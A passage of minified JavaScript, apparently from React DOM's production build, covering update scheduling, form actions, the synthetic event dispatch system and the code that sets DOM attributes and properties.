        t.callbackPriority = 0;
    if ((l & 3) === 0 || Ul(t, l)) {
      if (e = l & -l,
        e === t.callbackPriority)
        return e;
      switch (a !== null && Se(a),
      Nn(l)) {
        case 2:
        case 8:
          l = al;
          break;
        case 32:
          l = Fe;
          break;
        case 268435456:
          l = Ua;
          break;
        default:
          l = Fe
      }
      return a = dd.bind(null, t),
        l = Q(l, a),
        t.callbackPriority = e,
        t.callbackNode = l,
        e
    }
    return a !== null && a !== null && Se(a),
      t.callbackPriority = 2,
      t.callbackNode = null,
      2
  }
  function dd(t, e) {
    if (me !== 0 && me !== 5)
      return t.callbackNode = null,
        t.callbackPriority = 0,
        null;
    var l = t.callbackNode;
    if (pu() && t.callbackNode !== l)
      return null;
    var a = xt;
    return a = ma(t, t === Bt ? a : 0, t.cancelPendingCommit !== null || t.timeoutHandle !== -1),
      a === 0 ? null : (Jf(t, a, e),
        fd(t, Ee()),
        t.callbackNode != null && t.callbackNode === l ? dd.bind(null, t) : null)
  }
  function md(t, e) {
    if (pu())
      return null;
    Jf(t, e, !0)
  }
  function sp() {
    bp(function () {
      (kt & 6) !== 0 ? Q(gl, cp) : od()
    })
  }
  function _s() {
    return ka === 0 && (ka = zi()),
      ka
  }
  function pd(t) {
    return t == null || typeof t == "symbol" || typeof t == "boolean" ? null : typeof t == "function" ? t : Ai("" + t)
  }
  function hd(t, e) {
    var l = e.ownerDocument.createElement("input");
    return l.name = e.name,
      l.value = e.value,
      t.id && l.setAttribute("form", t.id),
      e.parentNode.insertBefore(l, e),
      t = new FormData(t),
      l.parentNode.removeChild(l),
      t
  }
  function rp(t, e, l, a, n) {
    if (e === "submit" && l && l.stateNode === n) {
      var i = pd((n[ge] || null).action)
        , u = a.submitter;
      u && (e = (e = u[ge] || null) ? pd(e.formAction) : u.getAttribute("formAction"),
        e !== null && (i = e,
          u = null));
      var s = new ki("action", "action", null, a, n);
      t.push({
        event: s,
        listeners: [{
          instance: null,
          listener: function () {
            if (a.defaultPrevented) {
              if (ka !== 0) {
                var f = u ? hd(n, u) : new FormData(n);
                Zc(l, {
                  pending: !0,
                  data: f,
                  method: n.method,
                  action: i
                }, null, f)
              }
            } else
              typeof i == "function" && (s.preventDefault(),
                f = u ? hd(n, u) : new FormData(n),
                Zc(l, {
                  pending: !0,
                  data: f,
                  method: n.method,
                  action: i
                }, i, f))
          },
          currentTarget: n
        }]
      })
    }
  }
  for (var Es = 0; Es < oc.length; Es++) {
    var As = oc[Es]
      , op = As.toLowerCase()
      , fp = As[0].toUpperCase() + As.slice(1);
    Pe(op, "on" + fp)
  }
  Pe(Vr, "onAnimationEnd"),
    Pe(Kr, "onAnimationIteration"),
    Pe(Jr, "onAnimationStart"),
    Pe("dblclick", "onDoubleClick"),
    Pe("focusin", "onFocus"),
    Pe("focusout", "onBlur"),
    Pe(Mm, "onTransitionRun"),
    Pe(Om, "onTransitionStart"),
    Pe(Rm, "onTransitionCancel"),
    Pe($r, "onTransitionEnd"),
    ft("onMouseEnter", ["mouseout", "mouseover"]),
    ft("onMouseLeave", ["mouseout", "mouseover"]),
    ft("onPointerEnter", ["pointerout", "pointerover"]),
    ft("onPointerLeave", ["pointerout", "pointerover"]),
    F("onChange", "change click focusin focusout input keydown keyup selectionchange".split(" ")),
    F("onSelect", "focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),
    F("onBeforeInput", ["compositionend", "keypress", "textInput", "paste"]),
    F("onCompositionEnd", "compositionend focusout keydown keypress keyup mousedown".split(" ")),
    F("onCompositionStart", "compositionstart focusout keydown keypress keyup mousedown".split(" ")),
    F("onCompositionUpdate", "compositionupdate focusout keydown keypress keyup mousedown".split(" "));
  var ui = "abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" ")
    , dp = new Set("beforetoggle cancel close invalid load scroll scrollend toggle".split(" ").concat(ui));
  function gd(t, e) {
    e = (e & 4) !== 0;
    for (var l = 0; l < t.length; l++) {
      var a = t[l]
        , n = a.event;
      a = a.listeners;
      t: {
        var i = void 0;
        if (e)
          for (var u = a.length - 1; 0 <= u; u--) {
            var s = a[u]
              , f = s.instance
              , x = s.currentTarget;
            if (s = s.listener,
              f !== i && n.isPropagationStopped())
              break t;
            i = s,
              n.currentTarget = x;
            try {
              i(n)
            } catch (_) {
              au(_)
            }
            n.currentTarget = null,
              i = f
          }
        else
          for (u = 0; u < a.length; u++) {
            if (s = a[u],
              f = s.instance,
              x = s.currentTarget,
              s = s.listener,
              f !== i && n.isPropagationStopped())
              break t;
            i = s,
              n.currentTarget = x;
            try {
              i(n)
            } catch (_) {
              au(_)
            }
            n.currentTarget = null,
              i = f
          }
      }
    }
  }
  function vt(t, e) {
    var l = e[Tn];
    l === void 0 && (l = e[Tn] = new Set);
    var a = t + "__bubble";
    l.has(a) || (vd(e, t, 2, !1),
      l.add(a))
  }
  function Ms(t, e, l) {
    var a = 0;
    e && (a |= 4),
      vd(l, t, a, e)
  }
  var vu = "_reactListening" + Math.random().toString(36).slice(2);
  function Os(t) {
    if (!t[vu]) {
      t[vu] = !0,
        j.forEach(function (l) {
          l !== "selectionchange" && (dp.has(l) || Ms(l, !1, t),
            Ms(l, !0, t))
        });
      var e = t.nodeType === 9 ? t : t.ownerDocument;
      e === null || e[vu] || (e[vu] = !0,
        Ms("selectionchange", !1, e))
    }
  }
  function vd(t, e, l, a) {
    switch (Gd(e)) {
      case 2:
        var n = Bp;
        break;
      case 8:
        n = Yp;
        break;
      default:
        n = Qs
    }
    l = n.bind(null, e, l, t),
      n = void 0,
      !Fu || e !== "touchstart" && e !== "touchmove" && e !== "wheel" || (n = !0),
      a ? n !== void 0 ? t.addEventListener(e, l, {
        capture: !0,
        passive: n
      }) : t.addEventListener(e, l, !0) : n !== void 0 ? t.addEventListener(e, l, {
        passive: n
      }) : t.addEventListener(e, l, !1)
  }
  function Rs(t, e, l, a, n) {
    var i = a;
    if ((e & 1) === 0 && (e & 2) === 0 && a !== null)
      t: for (; ;) {
        if (a === null)
          return;
        var u = a.tag;
        if (u === 3 || u === 4) {
          var s = a.stateNode.containerInfo;
          if (s === n)
            break;
          if (u === 4)
            for (u = a.return; u !== null;) {
              var f = u.tag;
              if ((f === 3 || f === 4) && u.stateNode.containerInfo === n)
                return;
              u = u.return
            }
          for (; s !== null;) {
            if (u = Yl(s),
              u === null)
              return;
            if (f = u.tag,
              f === 5 || f === 6 || f === 26 || f === 27) {
              a = i = u;
              continue t
            }
            s = s.parentNode
          }
        }
        a = a.return
      }
    zr(function () {
      var x = i
        , _ = $u(l)
        , M = [];
      t: {
        var z = Wr.get(t);
        if (z !== void 0) {
          var N = ki
            , ct = t;
          switch (t) {
            case "keypress":
              if (Oi(l) === 0)
                break t;
            case "keydown":
            case "keyup":
              N = um;
              break;
            case "focusin":
              ct = "focus",
                N = ec;
              break;
            case "focusout":
              ct = "blur",
                N = ec;
              break;
            case "beforeblur":
            case "afterblur":
              N = ec;
              break;
            case "click":
              if (l.button === 2)
                break t;
            case "auxclick":
            case "dblclick":
            case "mousedown":
            case "mousemove":
            case "mouseup":
            case "mouseout":
            case "mouseover":
            case "contextmenu":
              N = _r;
              break;
            case "drag":
            case "dragend":
            case "dragenter":
            case "dragexit":
            case "dragleave":
            case "dragover":
            case "dragstart":
            case "drop":
              N = J0;
              break;
            case "touchcancel":
            case "touchend":
            case "touchmove":
            case "touchstart":
              N = rm;
              break;
            case Vr:
            case Kr:
            case Jr:
              N = F0;
              break;
            case $r:
              N = fm;
              break;
            case "scroll":
            case "scrollend":
              N = V0;
              break;
            case "wheel":
              N = mm;
              break;
            case "copy":
            case "cut":
            case "paste":
              N = P0;
              break;
            case "gotpointercapture":
            case "lostpointercapture":
            case "pointercancel":
            case "pointerdown":
            case "pointermove":
            case "pointerout":
            case "pointerover":
            case "pointerup":
              N = Ar;
              break;
            case "toggle":
            case "beforetoggle":
              N = hm
          }
          var nt = (e & 4) !== 0
            , wt = !nt && (t === "scroll" || t === "scrollend")
            , v = nt ? z !== null ? z + "Capture" : null : z;
          nt = [];
          for (var m = x, b; m !== null;) {
            var E = m;
            if (b = E.stateNode,
              E = E.tag,
              E !== 5 && E !== 26 && E !== 27 || b === null || v === null || (E = _n(m, v),
                E != null && nt.push(ci(m, E, b))),
              wt)
              break;
            m = m.return
          }
          0 < nt.length && (z = new N(z, ct, null, l, _),
            M.push({
              event: z,
              listeners: nt
            }))
        }
      }
      if ((e & 7) === 0) {
        t: {
          if (z = t === "mouseover" || t === "pointerover",
            N = t === "mouseout" || t === "pointerout",
            z && l !== Ju && (ct = l.relatedTarget || l.fromElement) && (Yl(ct) || ct[ql]))
            break t;
          if ((N || z) && (z = _.window === _ ? _ : (z = _.ownerDocument) ? z.defaultView || z.parentWindow : window,
            N ? (ct = l.relatedTarget || l.toElement,
              N = x,
              ct = ct ? Yl(ct) : null,
              ct !== null && (wt = R(ct),
                nt = ct.tag,
                ct !== wt || nt !== 5 && nt !== 27 && nt !== 6) && (ct = null)) : (N = null,
                  ct = x),
            N !== ct)) {
            if (nt = _r,
              E = "onMouseLeave",
              v = "onMouseEnter",
              m = "mouse",
              (t === "pointerout" || t === "pointerover") && (nt = Ar,
                E = "onPointerLeave",
                v = "onPointerEnter",
                m = "pointer"),
              wt = N == null ? z : d(N),
              b = ct == null ? z : d(ct),
              z = new nt(E, m + "leave", N, l, _),
              z.target = wt,
              z.relatedTarget = b,
              E = null,
              Yl(_) === x && (nt = new nt(v, m + "enter", ct, l, _),
                nt.target = b,
                nt.relatedTarget = wt,
                E = nt),
              wt = E,
              N && ct)
              e: {
                for (nt = N,
                  v = ct,
                  m = 0,
                  b = nt; b; b = gn(b))
                  m++;
                for (b = 0,
                  E = v; E; E = gn(E))
                  b++;
                for (; 0 < m - b;)
                  nt = gn(nt),
                    m--;
                for (; 0 < b - m;)
                  v = gn(v),
                    b--;
                for (; m--;) {
                  if (nt === v || v !== null && nt === v.alternate)
                    break e;
                  nt = gn(nt),
                    v = gn(v)
                }
                nt = null
              }
            else
              nt = null;
            N !== null && bd(M, z, N, nt, !1),
              ct !== null && wt !== null && bd(M, wt, ct, nt, !0)
          }
        }
        t: {
          if (z = x ? d(x) : window,
            N = z.nodeName && z.nodeName.toLowerCase(),
            N === "select" || N === "input" && z.type === "file")
            var K = Ur;
          else if (Dr(z))
            if (wr)
              K = _m;
            else {
              K = Nm;
              var ht = zm
            }
          else
            N = z.nodeName,
              !N || N.toLowerCase() !== "input" || z.type !== "checkbox" && z.type !== "radio" ? x && Ku(x.elementType) && (K = Ur) : K = Tm;
          if (K && (K = K(t, x))) {
            Cr(M, K, l, _);
            break t
          }
          ht && ht(t, z, x),
            t === "focusout" && x && z.type === "number" && x.memoizedProps.value != null && Vu(z, "number", z.value)
        }
        switch (ht = x ? d(x) : window,
        t) {
          case "focusin":
            (Dr(ht) || ht.contentEditable === "true") && (Za = ht,
              cc = x,
              Dn = null);
            break;
          case "focusout":
            Dn = cc = Za = null;
            break;
          case "mousedown":
            sc = !0;
            break;
          case "contextmenu":
          case "mouseup":
          case "dragend":
            sc = !1,
              Lr(M, l, _);
            break;
          case "selectionchange":
            if (Am)
              break;
          case "keydown":
          case "keyup":
            Lr(M, l, _)
        }
        var P;
        if (ac)
          t: {
            switch (t) {
              case "compositionstart":
                var it = "onCompositionStart";
                break t;
              case "compositionend":
                it = "onCompositionEnd";
                break t;
              case "compositionupdate":
                it = "onCompositionUpdate";
                break t
            }
            it = void 0
          }
        else
          La ? kr(t, l) && (it = "onCompositionEnd") : t === "keydown" && l.keyCode === 229 && (it = "onCompositionStart");
        it && (Mr && l.locale !== "ko" && (La || it !== "onCompositionStart" ? it === "onCompositionEnd" && La && (P = Nr()) : (Xl = _,
          Iu = "value" in Xl ? Xl.value : Xl.textContent,
          La = !0)),
          ht = bu(x, it),
          0 < ht.length && (it = new Er(it, t, null, l, _),
            M.push({
              event: it,
              listeners: ht
            }),
            P ? it.data = P : (P = jr(l),
              P !== null && (it.data = P)))),
          (P = vm ? bm(t, l) : ym(t, l)) && (it = bu(x, "onBeforeInput"),
            0 < it.length && (ht = new Er("onBeforeInput", "beforeinput", null, l, _),
              M.push({
                event: ht,
                listeners: it
              }),
              ht.data = P)),
          rp(M, t, x, l, _)
      }
      gd(M, e)
    })
  }
  function ci(t, e, l) {
    return {
      instance: t,
      listener: e,
      currentTarget: l
    }
  }
  function bu(t, e) {
    for (var l = e + "Capture", a = []; t !== null;) {
      var n = t
        , i = n.stateNode;
      if (n = n.tag,
        n !== 5 && n !== 26 && n !== 27 || i === null || (n = _n(t, l),
          n != null && a.unshift(ci(t, n, i)),
          n = _n(t, e),
          n != null && a.push(ci(t, n, i))),
        t.tag === 3)
        return a;
      t = t.return
    }
    return []
  }
  function gn(t) {
    if (t === null)
      return null;
    do
      t = t.return;
    while (t && t.tag !== 5 && t.tag !== 27);
    return t || null
  }
  function bd(t, e, l, a, n) {
    for (var i = e._reactName, u = []; l !== null && l !== a;) {
      var s = l
        , f = s.alternate
        , x = s.stateNode;
      if (s = s.tag,
        f !== null && f === a)
        break;
      s !== 5 && s !== 26 && s !== 27 || x === null || (f = x,
        n ? (x = _n(l, i),
          x != null && u.unshift(ci(l, x, f))) : n || (x = _n(l, i),
            x != null && u.push(ci(l, x, f)))),
        l = l.return
    }
    u.length !== 0 && t.push({
      event: e,
      listeners: u
    })
  }
  var mp = /\r\n?/g
    , pp = /\u0000|\uFFFD/g;
  function yd(t) {
    return (typeof t == "string" ? t : "" + t).replace(mp, `
`).replace(pp, "")
  }
  function xd(t, e) {
    return e = yd(e),
      yd(t) === e
  }
  function yu() { }
  function Ut(t, e, l, a, n, i) {
    switch (l) {
      case "children":
        typeof a == "string" ? e === "body" || e === "textarea" && a === "" || Ga(t, a) : (typeof a == "number" || typeof a == "bigint") && e !== "body" && Ga(t, "" + a);
        break;
      case "className":
        te(t, "class", a);
        break;
      case "tabIndex":
        te(t, "tabindex", a);
        break;
      case "dir":
      case "role":
      case "viewBox":
      case "width":
      case "height":
        te(t, l, a);
        break;
      case "style":
        xr(t, a, i);
        break;
      case "data":
        if (e !== "object") {
          te(t, "data", a);
          break
        }
      case "src":
      case "href":
        if (a === "" && (e !== "a" || l !== "href")) {
          t.removeAttribute(l);
          break
        }
        if (a == null || typeof a == "function" || typeof a == "symbol" || typeof a == "boolean") {
          t.removeAttribute(l);
          break
        }
        a = Ai("" + a),
          t.setAttribute(l, a);
        break;
      case "action":
      case "formAction":
        if (typeof a == "function") {
          t.setAttribute(l, "javascript:throw new Error('A React form was unexpectedly submitted. If you called form.submit() manually, consider using form.requestSubmit() instead. If you\\'re trying to use event.stopPropagation() in a submit event handler, consider also calling event.preventDefault().')");
          break
        } else
          typeof i == "function" && (l === "formAction" ? (e !== "input" && Ut(t, e, "name", n.name, n, null),
            Ut(t, e, "formEncType", n.formEncType, n, null),
            Ut(t, e, "formMethod", n.formMethod, n, null),
            Ut(t, e, "formTarget", n.formTarget, n, null)) : (Ut(t, e, "encType", n.encType, n, null),
              Ut(t, e, "method", n.method, n, null),
              Ut(t, e, "target", n.target, n, null)));
        if (a == null || typeof a == "symbol" || typeof a == "boolean") {
          t.removeAttribute(l);
          break
        }
        a = Ai("" + a),
          t.setAttribute(l, a);
        break;
      case "onClick":
        a != null && (t.onclick = yu);
        break;
      case "onScroll":
        a != null && vt("scroll", t);
        break;
      case "onScrollEnd":
        a != null && vt("scrollend", t);
        break;
      case "dangerouslySetInnerHTML":
        if (a != null) {
          if (typeof a != "object" || !("__html" in a))
            throw Error(r(61));
          if (l = a.__html,
            l != null) {
            if (n.children != null)
              throw Error(r(60));
            t.innerHTML = l
          }
        }
        break;
      case "multiple":
        t.multiple = a && typeof a != "function" && typeof a != "symbol";
        break;
      case "muted":
        t.muted = a && typeof a != "function" && typeof a != "symbol";
        break;
      case "suppressContentEditableWarning":
      case "suppressHydrationWarning":
      case "defaultValue":
      case "defaultChecked":
      case "innerHTML":
      case "ref":
        break;
      case "autoFocus":
        break;
      case "xlinkHref":
        if (a == null || typeof a == "function" || typeof a == "boolean" || typeof a == "symbol") {
          t.removeAttribute("xlink:href");
          break
        }
        l = Ai("" + a),
          t.setAttributeNS("http://www.w3.org/1999/xlink", "xlink:href", l);
        break;
      case "contentEditable":
      case "spellCheck":
      case "draggable":
      case "value":
      case "autoReverse":
      case "externalResourcesRequired":
      case "focusable":
      case "preserveAlpha":
        a != null && typeof a != "function" && typeof a != "symbol" ? t.setAttribute(l, "" + a) : t.removeAttribute(l);
        break;
      case "inert":
      case "allowFullScreen":
      case "async":
      case "autoPlay":
      case "controls":
      case "default":
      case "defer":
      case "disabled":
      case "disablePictureInPicture":
      case "disableRemotePlayback":
      case "formNoValidate":
      case "hidden":
      case "loop":
      case "noModule":
      case "noValidate":
      case "open":
      case "playsInline":
      case "readOnly":
      case "required":
      case "reversed":
      case "scoped":
      case "seamless":
      case "itemScope":
        a && typeof a != "function" && typeof a != "symbol" ? t.setAttribute(l, "") : t.removeAttribute(l);
        break;
      case "capture":
      case "download":
        a === !0 ? t.setAttribute(l, "") : a !== !1 && a != null && typeof a != "function" && typeof a != "symbol" ? t.setAttribute(l, a) : t.removeAttribute(l);
        break;
      case "cols":
      case "rows":
      case "size":
      case "span":
        a != null && typeof a != "function" && typeof a != "symbol" && !isNaN(a) && 1 <= a ? t.setAttribute(l, a) : t.removeAttribute(l);
        break;
      case "rowSpan":
      case "start":
        a == null || typeof a == "function" || typeof a == "symbol" || isNaN(a) ? t.removeAttribute(l) : t.setAttribute(l, a);
        break;
      case "popover":
        vt("beforetoggle", t),
          vt("toggle", t),
          ut(t, "popover", a);
        break;
      case "xlinkActuate":
        ee(t, "http://www.w3.org/1999/xlink", "xlink:actuate", a);
        break;
      case "xlinkArcrole":
        ee(t, "http://www.w3.org/1999/xlink", "xlink:arcrole", a);
        break;
      case "xlinkRole":
        ee(t, "http://www.w3.org/1999/xlink", "xlink:role", a);
        break;
      case "xlinkShow":
        ee(t, "http://www.w3.org/1999/xlink", "xlink:show", a);
        break;
      case "xlinkTitle":
        ee(t, "http://www.w3.org/1999/xlink", "xlink:title", a);
        break;
      case "xlinkType":
        ee(t, "http://www.w3.org/1999/xlink", "xlink:type", a);
        break;
      case "xmlBase":
        ee(t, "http://www.w3.org/XML/1998/namespace", "xml:base", a);
        break;
      case "xmlLang":
        ee(t, "http://www.w3.org/XML/1998/namespace", "xml:lang", a);
        break;
      case "xmlSpace":
        ee(t, "http://www.w3.org/XML/1998/namespace", "xml:space", a);
        break;
      case "is":
        ut(t, "is", a);
        break;
      case "innerText":
      case "textContent":
        break;
      default:
        (!(2 < l.length) || l[0] !== "o" && l[0] !== "O" || l[1] !== "n" && l[1] !== "N") && (l = L0.get(l) || l,
          ut(t, l, a))
    }
  }
  function ks(t, e, l, a, n, i) {
    switch (l) {
      case "style":
        xr(t, a, i);
        break;
      case "dangerouslySetInnerHTML":
        if (a != null) {
          if (typeof a != "object" || !("__html" in a))
            throw Error(r(61));
          if (l = a.__html,
            l != null) {
            if (n.children != null)
              throw Error(r(60));
            t.innerHTML = l
          }
        }
        break;
      case "children":
        typeof a == "string" ? Ga(t, a) : (typeof a == "number" || typeof a == "bigint") && Ga(t, "" + a);
        break;
      case "onScroll":
        a != null && vt("scroll", t);
        break;
      case "onScrollEnd":
        a != null && vt("scrollend", t);
        break;
      case "onClick":
        a != null && (t.onclick = yu);
        break;
      case "suppressContentEditableWarning":
      case "suppressHydrationWarning":
      case "innerHTML":
      case "ref":
        break;
      case "innerText":
      case "textContent":
        break;
      default:
        if (!Y.hasOwnProperty(l))
          t: {
            if (l[0] === "o" && l[1] === "n" && (n = l.endsWith("Capture"),
              e = l.slice(2, n ? l.length - 7 : void 0),
              i = t[ge] || null,
              i = i != null ? i[l] : null,
              typeof i == "function" && t.removeEventListener(e, i, n),
              typeof a == "function")) {
              typeof i != "function" && i !== null && (l in t ? t[l] = null : t.hasAttribute(l) && t.removeAttribute(l)),
                t.addEventListener(e, a, n);
              break t
            }
            l in t ? t[l] = a : a === !0 ? t.setAttribute(l, "") : ut(t, l, a)
          }
    }
  }
  function pe(t, e, l) {
    switch (e) {
      case "div":
      case "span":
      case "svg":
      case "path":
      case "a":
      case "g":
      case "p":
      case "li":
        break;
      case "img":
        vt("error", t),
          vt("load", t);
        var a = !1, n = !1, i;
        for (i in l)
          if (l.hasOwnProperty(i)) {
            var u = l[i];
            if (u != null)
              switch (i) {
                case "src":
                  a = !0;
                  break;
                case "srcSet":
                  n = !0;
                  break;
                case "children":
                case "dangerouslySetInnerHTML":
                  throw Error(r(137, e));
                default:
                  Ut(t, e, i, u, l, null)
              }
          }
        n && Ut(t, e, "srcSet", l.srcSet, l, null),
          a && Ut(t, e, "src", l.src, l, null);
        return;
      case "input":
        vt("invalid", t);
        var s = i = u = n = null
          , f = null
          , x = null;
        for (a in l)
          if (l.hasOwnProperty(a)) {
            var _ = l[a];
            if (_ != null)
              switch (a) {
                case "name":
                  n = _;
                  break;
                case "type":
                  u = _;
                  break;
                case "checked":
                  f = _;
                  break;
                case "defaultChecked":
                  x = _;
                  break;
                case "value":
                  i = _;
                  break;
                case "defaultValue":
                  s = _;
                  break;
                case "children":
                case "dangerouslySetInnerHTML":
                  if (_ != null)
                    throw Error(r(137, e));
                  break;
                default:
                  Ut(t, e, a, _, l, null)
              }
          }
        gr(t, i, s, f, x, u, n, !1),
          _i(t);
        return;
      case "select":
        vt("invalid", t),
          a = u = i = null;
        for (n in l)
          if (l.hasOwnProperty(n) && (s = l[n],
            s != null))
            switch (n) {
              case "value":
                i = s;
                break;
              case "defaultValue":
                u = s;
                break;
              case "multiple":
                a = s;
              default:
                Ut(t, e, n, s, l, null)
            }
        e = i,
          l = u,
          t.multiple = !!a,
          e != null ? Ya(t, !!a, e, !1) : l != null && Ya(t, !!a, l, !0);
        return;
      case "textarea":
        vt("invalid", t),
          i = n = a = null;
        for (u in l)
          if (l.hasOwnProperty(u) && (s = l[u],
            s != null))
            switch (u) {
              case "value":
                a = s;
                break;
              case "defaultValue":
                n = s;
                break;
              case "children":
                i = s;
                break;
              case "dangerouslySetInnerHTML":
                if (s != null)
                  throw Error(r(91));
                break;
              default:
                Ut(t, e, u, s, l, null)
            }
        br(t, a, n, i),
          _i(t);
        return;
      case "option":
        for (f in l)
          l.hasOwnProperty(f) && (a = l[f],
            a != null) && (f === "selected" ? t.selected = a && typeof a != "function" && typeof a != "symbol" : Ut(t, e, f, a, l, null));
        return;
      case "dialog":
        vt("beforetoggle", t),
          vt("toggle", t),
          vt("cancel", t),
          vt("close", t);
        break;
      case "iframe":
      case "object":
        vt("load", t);
        break;
      case "video":
      case "audio":
        for (a = 0; a < ui.length; a++)
          vt(ui[a], t);
        break;
      case "image":
        vt("error", t),
          vt("load", t);
        break;
      case "details":
        vt("toggle", t);
        break;
      case "embed":
      case "source":
      case "link":
        vt("error", t),
          vt("load", t);
      case "area":
      case "base":
      case "br":
      case "col":
      case "hr":
      case "keygen":
      case "meta":
      case "param":
      case "track":
      case "wbr":
      case "menuitem":
        for (x in l)
          if (l.hasOwnProperty(x) && (a = l[x],
            a != null))
            switch (x) {
              case "children":
              case "dangerouslySetInnerHTML":
                throw Error(r(137, e));
              default:
                Ut(t, e, x, a, l, null)
            }
        return;
      default:
        if (Ku(e)) {
          for (_ in l)
            l.hasOwnProperty(_) && (a = l[_],
              a !== void 0 && ks(t, e, _, a, l, void 0));
          return
        }
    }
    for (s in l)
      l.hasOwnProperty(s) && (a = l[s],
        a != null && Ut(t, e, s, a, l, null))
  }
  function hp(t, e, l, a) {
    switch (e) {
      case "div":
      case "span":
      case "svg":
      case "path":
      case "a":
      case "g":
      case "p":
      case "li":
        break;
      case "input":
        var n = null
          , i = null
          , u = null
          , s = null
          , f = null
          , x = null
          , _ = null;
        for (N in l) {
          var M = l[N];
          if (l.hasOwnProperty(N) && M != null)
            switch (N) {
              case "checked":
                break;
              case "value":
                break;
              case "defaultValue":
                f = M;
              default:
                a.hasOwnProperty(N) || Ut(t, e, N, null, a, M)
            }
        }
        for (var z in a) {
          var N = a[z];
          if (M = l[z],
            a.hasOwnProperty(z) && (N != null || M != null))
            switch (z) {
              case "type":
                i = N;
                break;
              case "name":
                n = N;
                break;
              case "checked":
                x = N;
                break;
              case "defaultChecked":
                _ = N;
                break;
              case "value":
                u = N;
                break;
              case "defaultValue":
                s = N;
                break;
              case "children":
              case "dangerouslySetInnerHTML":
                if (N != null)
                  throw Error(r(137, e));
                break;
              default:
                N !== M && Ut(t, e, z, N, a, M)
            }
        }
        Zu(t, u, s, f, x, _, i, n);
        return;
      case "select":
        N = u = s = z = null;
        for (i in l)
          if (f = l[i],
            l.hasOwnProperty(i) && f != null)
            switch (i) {
              case "value":
                break;
              case "multiple":
                N = f;
              default:
                a.hasOwnProperty(i) || Ut(t, e, i, null, a, f)
            }
        for (n in a)
          if (i = a[n],
            f = l[n],
            a.hasOwnProperty(n) && (i != null || f != null))
            switch (n) {
              case "value":
                z = i;
                break;
              case "defaultValue":
                s = i;
                break;
              case "multiple":
                u = i;
              default:
                i !== f && Ut(t, e, n, i, a, f)
            }
        e = s,
          l = u,
          a = N,
          z != null ? Ya(t, !!l, z, !1) : !!a != !!l && (e != null ? Ya(t, !!l, e, !0) : Ya(t, !!l, l ? [] : "", !1));
        return;
      case "textarea":
        N = z = null;
        for (s in l)
          if (n = l[s],
            l.hasOwnProperty(s) && n != null && !a.hasOwnProperty(s))
            switch (s) {
              case "value":
                break;
              case "children":
                break;
              default:
                Ut(t, e, s, null, a, n)
            }
        for (u in a)
          if (n = a[u],
            i = l[u],
            a.hasOwnProperty(u) && (n != null || i != null))
            switch (u) {
              case "value":
                z = n;
                break;
              case "defaultValue":
                N = n;
                break;
              case "children":
                break;
              case "dangerouslySetInnerHTML":
                if (n != null)
                  throw Error(r(91));
                break;
              default:
                n !== i && Ut(t, e, u, n, a, i)
            }
        vr(t, z, N);
        return;
      case "option":
        for (var ct in l)
          z = l[ct],
            l.hasOwnProperty(ct) && z != null && !a.hasOwnProperty(ct) && (ct === "selected" ? t.selected = !1 : Ut(t, e, ct, null, a, z));
        for (f in a)
          z = a[f],
            N = l[f],
            a.hasOwnProperty(f) && z !== N && (z != null || N != null) && (f === "selected" ? t.selected = z && typeof z != "function" && typeof z != "symbol" : Ut(t, e, f, z, a, N));
        return;
      case "img":
      case "link":
      case "area":
      case "base":
      case "br":
      case "col":
      case "embed":
      case "hr":
      case "keygen":
      case "meta":
      case "param":
      case "source":
      case "track":
      case "wbr":
      case "menuitem":
        for (var nt in l)
          z = l[nt],
            l.hasOwnProperty(nt) && z != null && !a.hasOwnProperty(nt) && Ut(t, e, nt, null, a, z);
        for (x in a)
          if (z = a[x],
            N = l[x],
            a.hasOwnProperty(x) && z !== N && (z != null || N != null))
            switch (x) {
              case "children":
              case "dangerouslySetInnerHTML":
                if (z != null)
                  throw Error(r(137, e));
                break;
              default:
                Ut(t, e, x, z, a, N)
            }
        return;
      default:
        if (Ku(e)) {
          for (var wt in l)
            z = l[wt],
              l.hasOwnProperty(wt) && z !== void 0 && !a.hasOwnProperty(wt) && ks(t, e, wt, void 0, a, z);
          for (_ in a)
            z = a[_],
              N = l[_],
              !a.hasOwnProperty(_) || z === N || z === void 0 && N === void 0 || ks(t, e, _, z, a, N);
          return
        }
    }
    for (var v in l)
      z = l[v],
        l.hasOwnProperty(v) && z != null && !a.hasOwnProperty(v) && Ut(t, e, v, null, a, z);
    for (M in a)
      z = a[M],
        N = l[M],
        !a.hasOwnProperty(M) || z === N || z == null && N == null || Ut(t, e, M, z, a, N)
  }
  var js = null
    , Ds = null;
  function xu(t) {
    return t.nodeType === 9 ? t : t.ownerDocument
  }
  function Sd(t) {
    switch (t) {
      case "http://www.w3.org/2000/svg":
        return 1;
      case "http://www.w3.org/1998/Math/MathML":
        return 2;
      default:
        return 0
    }
  }
  function zd(t, e) {
    if (t === 0)
      switch (e) {
        case "svg":
          return 1;
        case "math":
          return 2;
        default:
          return 0
      }
    return t === 1 && e === "foreignObject" ? 0 : t
  }
  function Cs(t, e) {
    return t === "textarea" || t === "noscript" || typeof e.children == "string" || typeof e.children == "number" || typeof e.children == "bigint" || typeof e.dangerouslySetInnerHTML == "object" && e.dangerouslySetInnerHTML !== null && e.dangerouslySetInnerHTML.__html != null
  }
  var Us = null;
  function gp() {
    var t = window.event;
    return t && t.type === "popstate" ? t === Us ? !1 : (Us = t,
      !0) : (Us = null,
        !1)
  }
  var Nd = typeof setTimeout == "function" ? setTimeout : void 0
    , vp = typeof clearTimeout == "function" ? clearTimeout : void 0
    , Td = typeof Promise == "function" ? Promise : void 0
    , bp = typeof queueMicrotask == "function" ? queueMicrotask : typeof Td < "u" ? function (t) {
      return Td.resolve(null).then(t).catch(yp)
    }
      : Nd;
  function yp(t) {
    setTimeout(function () {
      throw t
    })
  }
  function na(t) {
    return t === "head"
  }
  function _d(t, e) {
    var l = e
      , a = 0
      , n = 0;
    do {
      var i = l.nextSibling;
      if (t.removeChild(l),
        i && i.nodeType === 8)
        if (l = i.data,
          l === "/$") {
          if (0 < a && 8 > a) {
            l = a;
            var u = t.ownerDocument;
            if (l & 1 && si(u.documentElement),
              l & 2 && si(u.body),
              l & 4)
              for (l = u.head,
                si(l),
                u = l.firstChild; u;) {
                var s = u.nextSibling
                  , f = u.nodeName;
                u[Bl] || f === "SCRIPT" || f === "STYLE" || f === "LINK" && u.rel.toLowerCase() === "stylesheet" || l.removeChild(u),
                  u = s
              }
          }
          if (n === 0) {
            t.removeChild(i),
              gi(e);
            return
          }
          n--
        } else
